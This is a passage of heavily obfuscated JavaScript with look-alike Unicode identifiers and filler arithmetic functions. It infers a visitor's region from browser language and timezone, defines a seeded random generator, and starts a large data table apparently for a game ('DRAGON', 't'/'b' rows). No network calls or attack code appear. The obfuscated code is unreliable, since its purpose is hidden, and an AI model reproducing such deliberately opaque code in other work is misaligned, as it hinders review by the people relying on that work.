			const ⲆΔⵠⲆⵠΔΔ = (22695477 * (ΔᐃᐃⵠⵠΔΔ + 19887) + 1) % 4294967296;
			const ⲆΔⵠⲆᐃⲆΔ = ((30774 + ⵠᐃΔⲆᐃΔⲆ) * 1664525 + 1013904223) % 4294967296;
			const ᐃⲆⲆΔⲆᐃⵠ = ᐃⲆᐃⵠⲆⵠᐃ(ⲆⲆⵠΔΔᐃᐃ, ᐃᐃⲆᐃΔΔᐃ);
			const ⵠᐃⲆⵠΔΔⵠ = ⲆᐃⲆⲆⲆΔΔ(ᐃⲆⵠⵠᐃᐃⲆ, ⲆⵠⵠΔΔⵠᐃ, ⲆΔⵠⲆⵠΔΔ, ⲆΔⵠⲆᐃⲆΔ, ⲆⲆⵠΔΔᐃᐃ);
			const ΔΔⲆⲆⲆᐃΔ = (8 << ((ᐃⲆⲆΔⲆᐃⵠ ^ ⵠᐃⲆⵠΔΔⵠ) >> ΔΔᐃᐃΔ & 255)) + (24 << ((ᐃⲆⲆΔⲆᐃⵠ ^ ⵠᐃⲆⵠΔΔⵠ) >> 24 & ᐃᐃᐃⵠⵠ)) + (0 << ((ᐃⲆⲆΔⲆᐃⵠ ^ ⵠᐃⲆⵠΔΔⵠ) >> 0 & 255)) + (16 << ((ᐃⲆⲆΔⲆᐃⵠ ^ ⵠᐃⲆⵠΔΔⵠ) >> 8 & 255));
			return ΔΔⲆⲆⲆᐃΔ
		}
		const ᐃᐃΔΔΔⵠⵠΔᐃ = ΔⲆⵠᐃⵠⵠΔ;
		const ⵠⵠⲆⲆⵠ = ΔⲆΔᐃᐃ;
		const ᐃᐃΔᐃⲆⵠΔⵠᐃ = ΔᐃΔᐃᐃⲆⵠ;

		function ᐃⵠⵠⲆᐃⵠⲆ(ⵠⲆⵠΔⲆ, ⲆᐃⲆᐃᐃⲆᐃ, ⵠⲆⵠⲆⵠΔⵠ, ᐃᐃⲆⵠⵠⵠⲆ) {
			ᐃⵠᐃᐃΔΔΔ(ⲆᐃΔⵠⲆ, ⵠⲆⵠΔⲆ, ⲆᐃⲆᐃᐃⲆᐃ, ⵠⲆⵠⲆⵠΔⵠ, ᐃᐃⲆⵠⵠⵠⲆ);
			const ⵠΔΔⵠⵠⲆΔ = ΔΔᐃⵠΔᐃⲆ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[ⲆᐃᐃⲆ], ΔᐃΔᐃ[3], ΔᐃΔᐃ[0], ΔᐃΔᐃ[ᐃᐃⵠ]);
			const ⲆⲆⵠᐃⲆᐃⵠⵠᐃ = ⲆᐃⵠⲆΔⲆΔ(ΔᐃΔᐃ[2], ΔᐃΔᐃ[ⲆᐃΔᐃ], ΔᐃΔᐃ[0], ΔᐃΔᐃ[Ⲇᐃⵠ], ΔᐃΔᐃ[ΔⵠᐃⲆ], ΔᐃΔᐃ[ⲆᐃΔᐃ]);
			const ᐃⲆΔΔΔⵠΔ = 9463 ^ ⵠΔΔⵠⵠⲆΔ;
			return ᐃⲆΔΔΔⵠΔ
		}
		const ΔΔⲆᐃⵠ = ΔΔΔΔⲆ;

		function ⲆᐃᐃⲆΔᐃⲆ(ⵠΔⲆΔⲆᐃᐃ, ΔⵠΔᐃⲆΔⲆ, ⲆΔⵠΔᐃ, ΔⵠΔΔΔᐃᐃ, ⵠΔΔΔⵠⲆᐃ, ΔΔᐃⵠᐃᐃΔ) {
			ⲆᐃⲆΔⲆΔⵠ(ⲆᐃΔⵠⲆ, ⵠΔⲆΔⲆᐃᐃ, ΔⵠΔᐃⲆΔⲆ, ⲆΔⵠΔᐃ, ΔⵠΔΔΔᐃᐃ, ⵠΔΔΔⵠⲆᐃ, ΔΔᐃⵠᐃᐃΔ);
			const ΔᐃΔᐃΔⲆΔ = ΔΔᐃᐃᐃⵠⵠ(ΔᐃΔᐃ[Δⵠᐃ], ΔᐃΔᐃ[1]);
			const ⲆΔⵠΔΔⵠΔ = ⵠⲆᐃΔᐃⲆΔ(ΔᐃΔᐃ[ΔⵠᐃⲆ], ΔᐃΔᐃ[3], ΔᐃΔᐃ[ⵠᐃᐃⲆ]);
			const ΔⲆᐃΔᐃΔΔ = (16 << ((ΔᐃΔᐃΔⲆΔ ^ ⲆΔⵠΔΔⵠΔ) >> 0 & 255)) + (0 << ((ΔᐃΔᐃΔⲆΔ ^ ⲆΔⵠΔΔⵠΔ) >> 8 & 255)) + (8 << ((ΔᐃΔᐃΔⲆΔ ^ ⲆΔⵠΔΔⵠΔ) >> 24 & 255)) + (24 << ((ΔᐃΔᐃΔⲆΔ ^ ⲆΔⵠΔΔⵠΔ) >> 16 & 255));
			return ΔⲆᐃΔᐃΔΔ
		}
		const ᐃⵠᐃᐃᐃⲆΔ = ΔⵠⲆⵠᐃ;
		var ΔᐃⵠⲆΔ = navigator.language || navigator.userLanguage;
		var ⵠΔΔΔⲆ = -((new Date).getTimezoneOffset() / 60);
		var ⵠⵠᐃⵠᐃⵠᐃ = "Europe";
		var ΔΔⵠᐃⵠᐃⲆ = "Russia";
		var ᐃᐃΔⵠⲆᐃⵠ = "North America";
		const ⵠᐃΔΔⵠ = ᐃⵠΔⵠⲆ;
		const ᐃⲆΔⲆ = ΔⵠᐃⲆ;
		var ΔᐃᐃⵠⵠΔⲆ = "South America";
		var ᐃⵠⲆΔⵠᐃⲆ = "West America";
		var ᐃᐃⵠⲆⵠΔⲆ = "Asia";
		const ΔⲆΔᐃ = ᐃⲆΔⵠ;
		var ΔΔⲆⲆᐃᐃⲆ = "Australia";
		var ⲆᐃΔΔΔ = ⵠⵠᐃⵠᐃⵠᐃ;
		const ⲆΔⲆΔⲆ = ⲆΔⲆⲆᐃ;
		if (ⵠΔΔΔⲆ >= -2 && ⵠΔΔΔⲆ <= ᐃⲆⵠᐃ) ⲆᐃΔΔΔ = ⵠⵠᐃⵠᐃⵠᐃ;
		else if (ⲆⲆΔᐃ < ⵠΔΔΔⲆ && 5 >= ⵠΔΔΔⲆ) ⲆᐃΔΔΔ = ΔΔⵠᐃⵠᐃⲆ;
		else if (ⵠΔΔΔⲆ > ᐃⲆⵠⵠ && ⵠΔΔΔⲆ <= 9) ⲆᐃΔΔΔ = ᐃᐃⵠⲆⵠΔⲆ;
		else if (ΔⵠᐃᐃⲆ < ⵠΔΔΔⲆ) ⲆᐃΔΔΔ = ΔΔⲆⲆᐃᐃⲆ;
		else if (ⵠΔΔΔⲆ >= -ᐃΔΔⲆ && ⵠΔΔΔⲆ < -2) {
			"pt-BR" === ΔᐃⵠⲆΔ || ΔᐃⵠⲆΔ === "pt-br" || ΔᐃⵠⲆΔ === "pt" || ΔᐃⵠⲆΔ === "pt-pt" ? ⲆᐃΔΔΔ = ΔᐃᐃⵠⵠΔⲆ : ⲆᐃΔΔΔ = ᐃᐃΔⵠⲆᐃⵠ
		} else if (ⵠΔΔΔⲆ < -ᐃΔΔΔ) {
			"pt-BR" === ΔᐃⵠⲆΔ || ΔᐃⵠⲆΔ === "pt-br" || "pt" === ΔᐃⵠⲆΔ || ΔᐃⵠⲆΔ === "pt-pt" ? ⲆᐃΔΔΔ = ΔᐃᐃⵠⵠΔⲆ : ⲆᐃΔΔΔ = ᐃⵠⲆΔⵠᐃⲆ
		}
		var ᐃⵠΔΔⲆ = function() {
			function ᐃⵠⵠΔΔᐃⲆ(ΔⵠⲆᐃⵠ) {
				var ⵠΔᐃΔⵠ = 2147483648;
				var ⲆⲆᐃⲆ = 1103515245;
				var ⲆΔᐃⲆ = 12345;
				var ΔⵠΔⲆ = ΔⵠⲆᐃⵠ ? ΔⵠⲆᐃⵠ : Math.floor(Math.random() * (ⵠΔᐃΔⵠ - ΔΔΔ));
				this.ⲆⲆⲆΔⵠ = function(ΔⵠⲆᐃⵠ) {
					ΔⵠΔⲆ = ΔⵠⲆᐃⵠ ? ΔⵠⲆᐃⵠ : Math.floor(Math.random() * (ⵠΔᐃΔⵠ - ⵠΔΔ))
				};
				this.get = function() {
					ΔⵠΔⲆ = (ΔⵠΔⲆ * ⲆⲆᐃⲆ + ⲆΔᐃⲆ) % ⵠΔᐃΔⵠ;
					return ΔⵠΔⲆ / ⵠΔᐃΔⵠ
				}
			}
			return {
				"ᐃⵠⵠΔΔᐃⲆ": ᐃⵠⵠΔΔᐃⲆ
			}
		}();

		function ⵠⵠⲆⲆⵠⵠᐃ(ΔᐃⲆΔⵠⵠⲆ, ᐃⲆΔᐃᐃᐃⲆ, ᐃᐃᐃᐃΔΔⵠ, ᐃᐃΔⲆΔⵠΔ) {
			const ΔΔⵠᐃᐃⵠΔ = (22695477 * (ΔᐃⲆΔⵠⵠⲆ + 12899) + ΔⲆⵠ) % 4294967296;
			const ΔⵠⵠΔⵠⵠⵠ = (214013 * (23010 + ᐃⲆΔᐃᐃᐃⲆ) + 2531011) % 4294967296;
			const ⲆⵠᐃⲆΔᐃⲆ = 58265 ^ ᐃᐃᐃᐃΔΔⵠ;
			const ⵠΔΔⲆΔᐃΔ = (39005 | ᐃᐃΔⲆΔⵠΔ) & ~(39005 & ᐃᐃΔⲆΔⵠΔ);
			const ᐃΔⲆⲆΔⵠⲆ = ⲆᐃⲆⲆⲆΔΔ(ΔΔⵠᐃᐃⵠΔ, ΔⵠⵠΔⵠⵠⵠ, ⲆⵠᐃⲆΔᐃⲆ, ⵠΔΔⲆΔᐃΔ, ΔΔⵠᐃᐃⵠΔ);
			const ⲆⵠⲆΔΔΔΔ = ᐃⵠΔΔⵠᐃΔ(ΔⵠⵠΔⵠⵠⵠ, ⲆⵠᐃⲆΔᐃⲆ, ⵠΔΔⲆΔᐃΔ);
			const ⲆⵠᐃΔⵠⲆⵠ = (2147483587 + 2147483629 * (43663 + (ᐃΔⲆⲆΔⵠⲆ ^ ⲆⵠⲆΔΔΔΔ))) % 2147483647;
			return ⲆⵠᐃΔⵠⲆⵠ
		}

		function ⵠⲆᐃⲆᐃΔΔ(ⲆⲆⲆᐃⵠΔᐃ, ΔᐃⵠᐃⲆᐃΔ) {
			const ᐃᐃⵠⵠⵠⵠᐃ = 10321 ^ ⲆⲆⲆᐃⵠΔᐃ;
			const ΔⵠⵠⵠⲆⲆΔ = (40510 | ΔᐃⵠᐃⲆᐃΔ) & ~(40510 & ΔᐃⵠᐃⲆᐃΔ);
			const ⲆⵠᐃᐃΔⵠⵠ = ᐃᐃⲆΔᐃᐃⲆ(ᐃᐃⵠⵠⵠⵠᐃ, ΔⵠⵠⵠⲆⲆΔ, ᐃᐃⵠⵠⵠⵠᐃ);
			const ⲆΔⵠⲆᐃⲆᐃᐃⵠ = ⲆᐃΔᐃΔⵠᐃ(ΔⵠⵠⵠⲆⲆΔ, ᐃᐃⵠⵠⵠⵠᐃ, ΔⵠⵠⵠⲆⲆΔ, ᐃᐃⵠⵠⵠⵠᐃ, ΔⵠⵠⵠⲆⲆΔ, ᐃᐃⵠⵠⵠⵠᐃ);
			const ⲆᐃΔⵠΔΔΔ = (ⲆⵠᐃᐃΔⵠⵠ | 5102) & ~(5102 & ⲆⵠᐃᐃΔⵠⵠ);
			return ⲆᐃΔⵠΔΔΔ
		}
		const ΔⲆⵠΔⲆ = ⲆΔⲆΔⵠ;
		const ΔᐃΔΔⵠ = ᐃᐃⲆᐃᐃ;
		const ⲆΔΔᐃᐃ = ᐃΔᐃΔⲆ;
		const ΔᐃᐃⲆᐃ = ΔᐃΔⲆⲆ;
		const ⲆⲆΔᐃᐃⲆⲆ = ΔⵠᐃΔⵠ;
		const ⲆᐃᐃᐃΔ = ᐃⵠⵠᐃᐃ;
		const ΔΔᐃⲆ = ⵠⵠΔΔ;

		function ⵠⵠᐃΔⵠⵠΔ(ΔᐃΔΔⲆⵠⵠ, ᐃⲆⵠⵠΔΔᐃ, ΔⲆⲆΔⲆΔⲆ, ΔⵠⲆΔⲆᐃᐃ, ⲆᐃΔⲆⲆᐃᐃ, ᐃⵠⵠⲆΔⲆᐃ) {
			ΔⲆΔⲆⵠⲆᐃ(ⲆᐃΔⵠⲆ, ΔᐃΔΔⲆⵠⵠ, ᐃⲆⵠⵠΔΔᐃ, ΔⲆⲆΔⲆΔⲆ, ΔⵠⲆΔⲆᐃᐃ, ⲆᐃΔⲆⲆᐃᐃ, ᐃⵠⵠⲆΔⲆᐃ);
			const ⵠᐃⲆᐃᐃᐃΔ = ⵠᐃⵠⲆΔᐃᐃ(ΔᐃΔᐃ[ΔΔⵠ], ΔᐃΔᐃ[ᐃⲆᐃ]);
			const ⵠⵠᐃⵠΔⲆⵠΔΔ = ⲆᐃᐃⲆΔᐃⲆ(ΔᐃΔᐃ[ᐃⲆⵠᐃ], ΔᐃΔᐃ[3], ΔᐃΔᐃ[ⲆⵠΔⵠ], ΔᐃΔᐃ[ᐃⲆⵠⵠ], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1]);
			const ⲆΔᐃⲆᐃΔⲆ = ⵠᐃⲆᐃᐃᐃΔ ^ 10454;
			return ⲆΔᐃⲆᐃΔⲆ
		}
		const ΔΔⵠΔⲆ = ᐃΔΔⲆΔ;
		const ⲆΔⵠ = ᐃⵠΔ;
		const ⵠᐃΔᐃᐃ = ᐃΔⲆⵠᐃ;

		function ᐃΔⲆᐃΔΔΔ(ᐃⵠΔⲆⲆ, ΔⵠⵠΔⵠ) {
			ᐃⵠⵠⵠᐃᐃᐃ(ⲆᐃΔⵠⲆ, ᐃⵠΔⲆⲆ, ΔⵠⵠΔⵠ);
			const ᐃᐃⵠΔΔⲆᐃ = ΔΔΔᐃᐃⲆⲆ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[ⵠΔΔ], ΔᐃΔᐃ[0], ΔᐃΔᐃ[ⵠΔⲆ]);
			const ΔⲆⲆⲆⵠΔΔ = ΔΔΔᐃᐃⲆⲆ(ΔᐃΔᐃ[ᐃⵠⲆ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[ⲆΔⵠ], ΔᐃΔᐃ[1]);
			const ⲆᐃⲆⲆⵠⲆᐃ = ((96 + (ᐃᐃⵠΔΔⲆᐃ ^ ΔⲆⲆⲆⵠΔΔ)) * 48271 + ᐃⵠⲆ) % 2147483647;
			return ⲆᐃⲆⲆⵠⲆᐃ
		}
		const ᐃⵠΔᐃΔΔⲆ = ⵠᐃᐃΔⲆ;
		const ⵠΔⲆⲆᐃⲆⲆᐃⵠ = ΔᐃΔᐃᐃⲆⵠ;

		function ⵠⲆᐃⲆⲆⵠΔ(ΔΔⲆⲆᐃⲆᐃ, ᐃⲆΔΔⲆⲆⲆ, ⲆᐃᐃⵠⲆᐃⲆ, ⵠⵠΔΔΔᐃⵠ, ᐃΔᐃⲆⵠᐃΔ) {
			ⲆᐃⲆⲆᐃᐃⲆ(ⲆᐃΔⵠⲆ, ΔΔⲆⲆᐃⲆᐃ, ᐃⲆΔΔⲆⲆⲆ, ⲆᐃᐃⵠⲆᐃⲆ, ⵠⵠΔΔΔᐃⵠ, ᐃΔᐃⲆⵠᐃΔ);
			const ⲆⲆΔᐃΔⵠⲆ = ΔΔΔᐃᐃⲆⲆ(ΔᐃΔᐃ[ⲆΔⵠ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[2], ΔᐃΔᐃ[3]);
			const ΔΔΔⲆⲆⲆⵠᐃⵠ = ⵠⲆⲆⵠΔᐃⵠ(ΔᐃΔᐃ[Ⲇⵠⵠⵠ], ΔᐃΔᐃ[0], ΔᐃΔᐃ[ⵠⲆΔ]);
			const ΔⵠⲆΔΔⵠⲆ = ~(ⲆⲆΔᐃΔⵠⲆ & 2632) & 2632 | ~(2632 & ⲆⲆΔᐃΔⵠⲆ) & ⲆⲆΔᐃΔⵠⲆ;
			return ΔⵠⲆΔΔⵠⲆ
		}
		var ⲆᐃⲆⵠᐃΔⵠ = [
			[ᐃⵠΔ, "DRAGON", 18, 6, 66, 35, ᐃⵠΔ],
			[ΔΔⵠ, ⵠ[437], 91, ᐃⵠⲆΔΔ, 5, 40, 8],
			[ΔⲆⲆ, ⵠ[33], 135, 180, 89, 124, ᐃΔΔΔ],
			[ᐃΔΔ, ⵠ[262], 142, ⵠᐃΔⵠⲆ, 82, 99, ⵠᐃᐃΔ],
			[0, ⵠ[573], ⲆΔᐃΔⵠ, 150, 90, 154, ᐃⵠⲆᐃᐃ],
			[0, ⵠ[437], ⵠᐃᐃΔ, 6, 90, 150, 0],
			[1, "b", ⵠⲆⲆ, 5, 175, Δⵠᐃ],
			[1, "t", ⲆⲆΔᐃ, ᐃⲆⵠⵠ, 174, ᐃΔΔ],
			[Ⲇᐃⵠ, "t", 5, ᐃⲆⵠⵠ, 173, ᐃⵠΔ],
			[ⵠΔΔ, "b", ΔⲆΔᐃ, 5, 176, ᐃⵠⲆ],
			[ΔⲆⵠ, "t", Δⵠᐃ, 5, 177, ᐃⵠⲆ],
			[ⵠΔⲆ, "t", ΔⲆᐃⲆ, ⲆΔΔᐃ, 178, ΔΔⵠ],
			[ᐃᐃⵠ, "t", 4, 5, 179, ᐃⵠⲆ],
			[1, "b", ΔⲆⲆ, ⵠⵠΔΔ, 180, ⵠⲆⲆ],
			[ΔΔΔ, "t", 5, ᐃΔΔⲆ, 181, ⲆΔⵠ],
			[1, "b", ⵠⵠΔⲆ, 5, 182, ᐃΔΔ],
			[1, "b", ΔⲆⵠ, 5, 183, 0],
			[ⵠΔⲆ, "b", 2, ⵠⵠΔΔ, 184, Δⵠᐃ],
			[ⵠΔΔ, "t", ΔΔᐃⲆ, ⲆΔΔᐃ, 185, 0],
			[ᐃⲆᐃ, "t", 2, 5, 186, ΔⲆⲆ],
			[1, "t", 0, ᐃΔΔⲆ, 187, 0],
			[1, "t", 5, 5, 188, 0],
			[ΔΔΔ, "t", 1, ⵠᐃΔⵠ, 189, ᐃⵠΔ],
			[ᐃᐃⵠ, "b", ΔⵠᐃⲆ, 5, 190, 0],
			[ⵠΔΔ, "t", Ⲇᐃⵠᐃ, 5, 191, Δⵠᐃ],
			[1, "b", ΔⲆᐃⲆ, ΔⵠⲆⲆ, 192, 0],
			[1, "t", 5, 5, 193, ΔⲆⲆ],
			[1, "t", 0, 5, 194, 0],
			[ᐃⲆᐃ, "t", ΔⲆΔᐃ, 5, 195, 0],
			[1, "b", 0, ᐃⲆⵠⵠ, 196, 0],
			[ⵠΔⲆ, "t", 5, 5, 197, 0],
			[ⵠΔᐃ, "t", 2, 5, 198, 0],
			[1, "b", ⵠⵠΔⲆ, ᐃΔΔΔ, 199, ᐃⵠⲆ],
			[1, "t", ⵠᐃᐃⲆ, 5, 200, Δⵠᐃ],
			[ⵠΔᐃ, "t", 1, 5, 201, 0],
			[1, "b", Ⲇᐃⵠ, ᐃΔΔⲆ, 202, 0],
			[1, "t", ΔΔᐃⲆ, ⵠⵠΔΔ, 203, ᐃⵠΔ],
			[1, "t", 2, ⵠᐃΔⵠ, 204, Δⵠᐃ],
			[ⵠΔⲆ, "t", 4, ᐃΔΔⲆ, 205, 0],
			[Ⲇᐃⵠ, "b", ⲆⲆΔᐃ, ΔΔᐃⲆ, 206, ΔΔⵠ],
			[ⵠⲆΔ, "t", ΔΔΔ, ⲆΔΔᐃ, 207, ΔⲆⲆ],
			[ⵠⲆΔ, "t", 4, 5, 208, Δⵠᐃ],
			[1, "t", 2, 5, 209, 0],
			[ᐃⲆᐃ, "b", 0, ᐃΔΔⲆ, 210, 0],
			[1, "t", 5, ⵠⵠΔΔ, 211, ΔⲆⲆ],
			[ⵠΔᐃ, "t", ⵠⲆΔ, 5, 212, 0],
			[1, "t", 2, ᐃΔΔΔ, 213, ᐃΔΔ],
			[ᐃᐃⵠ, "b", ᐃⲆᐃᐃ, 5, 214, ΔΔⵠ],
			[1, "t", 5, 5, 215, ΔⲆⲆ],
			[1, "b", ᐃⵠⲆ, ⲆΔΔᐃ, 216, ᐃΔΔ],
			[1, "t", 4, ⵠᐃΔⵠ, 217, Δⵠᐃ],
			[ΔΔΔ, "t", ᐃⲆΔⲆ, ᐃΔΔΔ, 218, ΔΔⵠ],
			[1, "t", 1, ᐃΔΔⲆ, 219, ᐃΔΔ],
			[1, "t", ⲆᐃΔᐃ, 5, 220, 0],
			[ⵠⲆΔ, "t", ⲆΔΔᐃ, 5, 221, ⲆΔⵠ],
			[ΔⲆⵠ, "t", 2, 5, 222, ⲆΔⵠ],
			[Ⲇᐃⵠ, "t", ᐃⵠⵠΔ, ΔⵠⲆⲆ, 223, 0],
			[1, "b", 3, 5, 224, ⲆΔⵠ],
			[Ⲇᐃⵠ, "t", 1, 5, 225, 0],
			[ⵠΔᐃ, "t", 3, 5, 226, 0],
			[ᐃᐃⵠ, "b", ᐃⵠⲆ, 5, 227, 0],
			[1, "t", 3, 5, 228, ⲆΔⵠ],
			[Ⲇᐃⵠ, "t", ᐃΔΔⲆ, 5, 229, 0],
			[ⵠΔⲆ, "t", ᐃⲆⵠᐃ, ΔΔᐃⲆ, 230, 0],
			[1, "t", ᐃⵠⲆ, 5, 231, 0],
			[ⵠΔᐃ, "b", ⲆⲆΔᐃ, ΔⵠⲆⲆ, 232, 0],
			[1, "t", 1, 5, 233, 0],
			[1, "t", ᐃⵠⵠΔ, 5, 234, 0],
			[ⵠΔΔ, "b", ⵠΔᐃ, ΔⵠⲆⲆ, 235, 0],
			[1, "t", 4, 5, 236, ᐃΔΔ],
			[1, "t", ΔⵠᐃⲆ, 5, 237, 0],
			[1, "t", 0, ⲆΔΔᐃ, 238, ᐃⵠⲆ],
			[ⵠΔᐃ, "t", ⵠᐃᐃⲆ, ΔΔᐃⲆ, 239, ⵠⲆⲆ],
			[ᐃⲆᐃ, "b", 2, ᐃⲆⵠⵠ, 240, 0],
			[ᐃⲆᐃ, "t", ⵠᐃΔⵠ, ᐃⲆⵠⵠ, 241, 0],
			[ⵠΔⲆ, "b", 1, ⵠᐃΔⵠ, 242, ΔⲆⲆ],
			[1, "t", ⲆᐃᐃΔ, ⵠᐃΔⵠ, 243, 0],
			[1, "t", ⲆⲆΔᐃ, ⲆΔΔᐃ, 244, 0],
			[ΔΔΔ, "t", 1, ΔⵠⲆⲆ, 245, 0],
			[1, "b", 1, ⵠᐃΔⵠ, 246, 0],
			[ΔⲆⵠ, "t", 3, 5, 247, 0],
			[ⵠΔⲆ, "b", ΔⵠᐃⲆ, 5, 248, 0],
			[ⵠΔΔ, "t", 5, 5, 249, ᐃⵠⲆ],
			[1, "t", 2, ᐃΔΔΔ, 250, 0],
			[1, "t", 4, ΔΔᐃⲆ, 251, ᐃⵠⲆ],
			[ᐃⲆᐃ, "b", ᐃⲆᐃ, ᐃΔΔΔ, 252, ᐃΔΔ],
			[1, "t", Ⲇⵠⵠⵠ, ᐃΔΔⲆ, 253, 0],
			[1, "t", 1, ⵠᐃΔⵠ, 254, 0],
			[1, "t", 3, ᐃⲆⵠⵠ, ᐃᐃᐃⵠⵠ, 0],
			[ᐃⲆᐃ, "t", 5, 5, 256, ᐃΔΔ],
			[ⵠΔΔ, "b", 2, ᐃΔΔΔ, 257, ᐃⵠΔ],
			[ᐃᐃⵠ, "t", 4, ᐃΔΔⲆ, 258, ᐃⵠΔ],
			[ⵠΔΔ, "b", 3, ⵠᐃΔⵠ, 259, 0],
			[ⵠΔᐃ, "t", 5, ᐃΔΔΔ, 260, 0],
			[1, "b", ᐃⵠⲆ, ᐃΔΔⲆ, 261, ᐃⵠⲆ],
			[1, "t", 3, ΔΔᐃⲆ, 262, 0],
			[ⵠⲆΔ, "t", 4, 5, 263, 0],
			[1, "t", 2, ᐃΔΔΔ, 264, ΔΔⵠ],
			[1, "b", 1, ⵠᐃΔⵠ, 265, ΔⲆⲆ],
			[1, "b", 2, ᐃΔΔΔ, 266, ᐃΔΔ],
			[1, "t", 3, ⵠᐃΔⵠ, 267, ᐃⵠΔ],
			[ⵠⲆΔ, "t", ⵠΔᐃΔ, ᐃΔΔΔ, 268, 0],
			[1, "t", 0, 5, 269, Δⵠᐃ],
			[ΔΔΔ, "t", 5, 5, 270, ᐃΔΔ],
			[1, "t", 3, ⲆΔΔᐃ, 271, 0],
			[1, "t", 4, 5, 272, ᐃⵠΔ],
			[ΔⲆⵠ, "t", ⵠⲆΔ, 5, 273, 0],
			[1, "b", 2, 5, 274, ΔⲆⲆ],
			[ⵠΔᐃ, "t", ΔΔΔ, ⵠᐃΔⵠ, 275, Δⵠᐃ],
			[1, "t", 4, ⲆΔΔᐃ, 276, ᐃΔΔ],
			[1, "b", 1, ΔⵠⲆⲆ, 277, 0],
			[1, "b", ΔⵠᐃⲆ, ᐃⲆⵠⵠ, 278, 0],
			[1, "t", 1, ΔⵠⲆⲆ, 279, 0],
			[ΔΔΔ, "t", ⵠΔᐃΔ, ᐃΔΔΔ, 280, 0],
			[1, "t", 2, ⲆΔΔᐃ, 281, ⵠⲆⲆ],
			[ⵠΔⲆ, "t", ⵠᐃΔⵠ, ᐃΔΔⲆ, 282, 0],
			[ⵠΔΔ, "b", ⲆⲆΔᐃ, ᐃⲆⵠⵠ, 283, ᐃⵠⲆ],
			[1, "t", 1, 5, 284, 0],
			[Ⲇᐃⵠ, "b", 3, ΔⵠⲆⲆ, 285, ᐃⵠΔ],
			[1, "t", 4, ⵠᐃΔⵠ, 286, ⵠⲆⲆ],
			[ᐃⲆᐃ, "t", ᐃⵠⲆ, ⵠⵠΔΔ, 287, Δⵠᐃ],
			[ⵠΔΔ, "t", 5, 5, 288, 0],
			[ᐃⲆᐃ, "t", ⲆᐃᐃⲆ, 5, 289, 0],
			[1, "b", 1, 5, 290, ⵠⲆⲆ],
			[1, "t", Ⲇᐃⵠᐃ, ⲆΔΔᐃ, 292, 0],
			[Ⲇᐃⵠ, "t", ᐃⲆΔⲆ, 5, 291, ᐃΔΔ],
			[1, "b", 2, ⵠⵠΔΔ, 293, ⵠⲆⲆ],
			[ᐃᐃⵠ, "t", 1, ΔΔᐃⲆ, 294, 0],
			[1, "t", ⲆΔⵠⵠ, ᐃⲆⵠⵠ, 295, 0],
			[1, "t", ΔⵠⲆⲆ, 5, 296, 0],
			[1, "b", 0, 5, 297, ΔⲆⲆ],
			[ⵠΔⲆ, "b", 3, 5, 298, ⵠⲆⲆ],
			[1, "t", 4, ΔΔᐃⲆ, 299, 0],
			[1, "t", ⲆᐃᐃⲆ, ᐃΔΔⲆ, 300, 0],
			[ΔΔΔ, "t", ⲆⲆⲆΔ, 5, 301, ᐃⵠΔ],
			[1, "b", ᐃⵠⲆ, ᐃⲆⵠⵠ, 302, 0],
			[Ⲇᐃⵠ, "b", 2, 5, 303, ⵠⲆⲆ],
			[1, "t", ᐃᐃⵠ, ⵠᐃΔⵠᐃ, 303, ΔΔⵠ],
			[1, "t", 2, ⵠΔᐃⵠⵠ, 303, ⲆΔⵠ],
			[1, "t", ⵠΔΔ, ᐃΔΔΔ, 304, Δⵠᐃ],
			[1, "t", 3, 6, 304, 0],
			[ᐃⲆᐃ, "t", 4, 7, 304, ᐃⵠⲆ],
			[1, "t", 5, 8, 303, ᐃⵠΔ],
			[ⵠⲆΔ, "b", ΔⲆⵠ, ⲆⲆᐃⵠΔ, 304, 0],
			[1, "b", 2, 9, 304, 0],
			[1, "b", ⵠⵠⵠᐃ, ⵠⲆⵠⲆⵠ, 303, 0],
			[ⵠⲆΔ, "b", 3, ΔΔⲆΔᐃᐃᐃ, 304, ⵠⲆⲆ],
			[ⵠΔⲆ, "t", ⵠΔΔ, 9, 303, 0],
			[1, "t", 1, 15, 304, ᐃΔΔ],
			[1, "t", ᐃᐃⵠ, Δⵠᐃⵠⵠ, 303, ᐃⵠⲆ],
			[1, "t", ΔⲆᐃⲆ, ⵠⵠⲆΔΔ, 303, 0],
			[ΔⲆⵠ, "t", ΔⲆᐃⲆ, 14, 304, 0],
			[ⵠⲆΔ, "t", 4, ᐃΔᐃΔⲆ, 304, ᐃΔΔ],
			[1, "t", ᐃⲆⵠⵠ, Ⲇᐃᐃᐃᐃ, 304, 0],
			[ⵠΔⲆ, "t", 5, 14, 303, 0],
			[ᐃᐃⵠ, "t", ⵠᐃΔⵠ, ⵠᐃⵠⵠⲆ, 304, 0],
			[1, "t", 5, 13, 304, 0],
			[ⵠΔᐃ, "t", ᐃⲆΔⲆ, ᐃᐃΔᐃⲆ, 304, Δⵠᐃ],
			[1, "t", 1, 11, 303, ᐃΔΔ],
			[ᐃᐃⵠ, "b", ᐃⲆΔⵠ, 15, 303, 0],
			[1, "b", ⵠⲆⲆ, ⵠΔⵠΔΔ, 303, 0],
			[ΔⲆⵠ, "t", 3, ΔⲆⲆΔΔ, 303, 0],
			[ΔⲆⵠ, "t", ⵠⲆⵠᐃ, ᐃΔΔⵠᐃ, 303, 0],
			[ᐃᐃⵠ, "t", 2, ΔΔⵠΔⲆ, 303, 0],
			[1, "t", ⵠΔⲆ, 20, 303, ᐃⵠⲆ],
			[1, "b", 1, 21, 303, 0],
			[1, "t", 2, 22, 303, 0],
			[ⵠΔΔ, "t", ⲆΔⵠᐃ, 23, 303, ᐃⵠΔ],
			[Ⲇᐃⵠ, "b", 3, 24, 303, Δⵠᐃ],
			[ⵠΔⲆ, "t", 5, 25, 303, ⵠⲆⲆ],
			[ᐃⲆᐃ, "t", ΔΔΔ, 26, 303, 0],
			[1, "t", ᐃⲆΔⲆ, 27, 303, ⲆΔⵠ],
			[1, "t", ⵠⲆⵠᐃ, 28, 303, ⵠⲆⲆ],
			[1, "b", 0, ᐃⵠⲆΔΔ, 304, 0],
			[1, "t", ΔⵠᐃⲆ, ⲆⲆⲆⵠᐃ, 304, 0],
			[ⵠΔᐃ, "t", ΔⵠⲆⲆ, ΔᐃⲆⵠᐃ, 304, Δⵠᐃ],
			[ⵠΔⲆ, "b", ⲆᐃᐃⲆ, 21, 304, 0],
